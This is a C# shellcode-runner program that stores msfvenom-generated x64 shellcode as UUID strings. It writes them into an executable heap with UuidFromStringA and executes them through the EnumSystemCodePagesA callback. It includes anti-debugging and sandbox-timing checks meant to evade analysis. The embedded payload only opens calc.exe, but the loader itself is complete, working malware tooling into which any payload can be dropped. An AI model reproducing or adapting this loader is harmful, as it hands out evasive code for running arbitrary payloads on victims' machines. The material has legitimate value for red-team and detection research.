using System;
using System.Runtime.InteropServices;

namespace EnumSystemCodePagesA_SC_Runner
{
    class Program
    {
        static void Main(string[] args)
        {
            // Heap space creation
            UIntPtr initSize = UIntPtr.Zero;
            UIntPtr maxSize = UIntPtr.Zero;
            uint HEAP_CREATE_ENABLE_EXECUTE = (uint)HeapCreationFlags.CREATE_ENABLE_EXECUTE;

            // msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
            // @boku7 - https://github.com/boku7/Ninja_UUID_Runner/blob/main/bin2uuids.py
            string[] uuids = {
                "e48148fc-fff0-ffff-e8d0-000000415141",
                "56515250-3148-65d2-488b-52603e488b52",
                "8b483e18-2052-483e-8b72-503e480fb74a",
                "c9314d4a-3148-acc0-3c61-7c022c2041c1",
                "01410dc9-e2c1-52ed-4151-3e488b52203e",
                "483c428b-d001-8b3e-8088-0000004885c0",
                "01486f74-50d0-8b3e-4818-3e448b402049",
                "5ce3d001-ff48-3ec9-418b-34884801d64d",
                "3148c931-acc0-c141-c90d-4101c138e075",
                "034c3ef1-244c-4508-39d1-75d6583e448b",
                "01492440-66d0-413e-8b0c-483e448b401c",
                "3ed00149-8b41-8804-4801-d0415841585e",
                "58415a59-5941-5a41-4883-ec204152ffe0",
                "5a594158-483e-128b-e949-ffffff5d49c7",
                "000000c1-3e00-8d48-95fe-0000003e4c8d",
                "00010a85-4800-c931-41ba-45835607ffd5",
                "41c93148-f0ba-a2b5-56ff-d548656c6c6f",
                "726f5720-646c-4d00-6573-73616765426f",
                "90900078-9090-9090-9090-909090909090"
            };

            DateTime tBegin = DateTime.Now;

            if (IsDebuggerPresent() == true)
            {
                return;
            }

            Sleep(2000);
            double tEnd = DateTime.Now.Subtract(tBegin).TotalSeconds;

            if (tEnd < 1.5)
            {
                return;
            }

            // Create heap
            IntPtr hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, initSize, maxSize);
            IntPtr hAddr = IntPtr.Zero; //Heap Allocation = DWORD_PTR = 0

            // Credit: @snovvcrash
            // Pad each UUID, convert to binary and move to the created heap
            for (int i = 0; i < uuids.Length; i++)
            {
                hAddr = IntPtr.Add(hHeap, 16 * i);
                UuidFromStringA(uuids[i], hAddr);
            }

            if (!EnumSystemCodePagesA(hHeap, 0))
            {
                return;
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr HeapCreate(uint flOptions, UIntPtr dwInitialSize, UIntPtr dwMaximumSize);

        [DllImport("kernel32.dll", SetLastError = false)]
        static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, UIntPtr dwBytes);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool EnumSystemCodePagesA(IntPtr lpCodePageEnumProc, uint dwFlags);

        [DllImport("Rpcrt4.dll", EntryPoint = "UuidFromStringA", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
        static extern int UuidFromStringA(string stringUuid, IntPtr heapPointer);
        
        [DllImport("kernel32.dll")]
        static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [Flags]
        enum HeapCreationFlags : uint
        {
            CREATE_ENABLE_EXECUTE = 0x00040000,
            GENERATE_EXCEPTIONS = 0x00000004,
            NO_SERIALIZE = 0x00000001
        }
    }
}
